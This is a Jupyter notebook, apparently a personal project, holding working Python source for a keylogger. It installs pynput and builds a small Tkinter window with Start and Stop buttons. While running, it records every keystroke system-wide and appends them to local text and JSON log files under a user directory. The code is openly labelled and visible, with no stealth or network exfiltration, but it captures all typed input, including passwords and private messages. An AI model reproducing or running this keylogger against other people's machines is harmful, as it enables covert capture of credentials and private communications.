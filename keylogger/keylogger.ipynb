{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "46103bc8-075c-4243-96ce-e406490d7513",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.7.6-py2.py3-none-any.whl.metadata (30 kB)\n",
      "Requirement already satisfied: six in d:\\coding\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.6-py2.py3-none-any.whl (89 kB)\n",
      "   ---------------------------------------- 0.0/89.2 kB ? eta -:--:--\n",
      "   --------------------------- ------------ 61.4/89.2 kB 1.7 MB/s eta 0:00:01\n",
      "   ---------------------------------------- 89.2/89.2 kB 1.7 MB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.6\n",
      "Note: you may need to restart the kernel to use updated packages.\n"
     ]
    }
   ],
   "source": [
    "pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2de4454d-d700-451a-aaa9-bab177a4a36c",
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "\n",
    "import tkinter as tk\n",
    "from tkinter import *\n",
    "from pynput import keyboard\n",
    "import json\n",
    "import os\n",
    "\n",
    "keys_used = []\n",
    "flag = False\n",
    "keys = \"\"\n",
    "last_sequence = \"\"\n",
    "\n",
    "# Specify the file paths\n",
    "OUTPUT_DIRECTORY = r\"C:\\Users\\srila\\keylogger\"\n",
    "TEXT_FILE_PATH = os.path.join(OUTPUT_DIRECTORY, \"key_log.txt\")\n",
    "JSON_FILE_PATH = os.path.join(OUTPUT_DIRECTORY, \"key_log.json\")\n",
    "\n",
    "def generate_text_log(keys):\n",
    "    with open(TEXT_FILE_PATH, \"a\") as keys_file:\n",
    "        keys_file.write(keys)\n",
    "\n",
    "def generate_json_file(keys_used):\n",
    "    with open(JSON_FILE_PATH, 'a') as key_log:\n",
    "        json.dump(keys_used, key_log)\n",
    "        key_log.write('\\n')\n",
    "\n",
    "def on_press(key):\n",
    "    global flag, keys_used, keys, last_sequence\n",
    "    if hasattr(key, 'char'):\n",
    "        keys += f\"'{key.char}'\"\n",
    "    elif key == keyboard.Key.space:\n",
    "        keys += \"' '\"\n",
    "    elif key == keyboard.Key.enter:\n",
    "        if keys != last_sequence:\n",
    "            keys_used.append({'Pressed': keys})\n",
    "            keys_used.append({'Pressed': 'Key.enter'})\n",
    "            last_sequence = keys\n",
    "        else:\n",
    "            keys_used.append({'Pressed': 'Key.enter'})\n",
    "        generate_json_file(keys_used)\n",
    "        generate_text_log(keys + \"'Key.enter'\\n\")\n",
    "        keys = \"\"\n",
    "\n",
    "def on_release(key):\n",
    "    pass\n",
    "\n",
    "def start_keylogger():\n",
    "    global listener\n",
    "    listener = keyboard.Listener(on_press=on_press, on_release=on_release)\n",
    "    listener.start()\n",
    "    label.config(text=\"[+] Keylogger is running!\\n[!] Saving the keys in '{}'\".format(TEXT_FILE_PATH))\n",
    "    start_button.config(state='disabled')\n",
    "    stop_button.config(state='normal')\n",
    "\n",
    "def stop_keylogger():\n",
    "    global listener\n",
    "    listener.stop()\n",
    "    label.config(text=\"Keylogger stopped.\")\n",
    "    start_button.config(state='normal')\n",
    "    stop_button.config(state='disabled')\n",
    "\n",
    "root = tk.Tk()\n",
    "root.title(\"Keylogger\")\n",
    "\n",
    "label = tk.Label(root, text='Click \"Start\" to begin keylogging.')\n",
    "label.config(anchor=CENTER)\n",
    "label.pack()\n",
    "\n",
    "start_button = tk.Button(root, text=\"Start\", command=start_keylogger)\n",
    "start_button.pack(side=LEFT)\n",
    "\n",
    "stop_button = tk.Button(root, text=\"Stop\", command=stop_keylogger, state='disabled')\n",
    "stop_button.pack(side=RIGHT)\n",
    "\n",
    "root.geometry(\"250x250\")\n",
    "\n",
    "root.mainloop()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "53880528-0995-4706-9b3b-513912151604",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
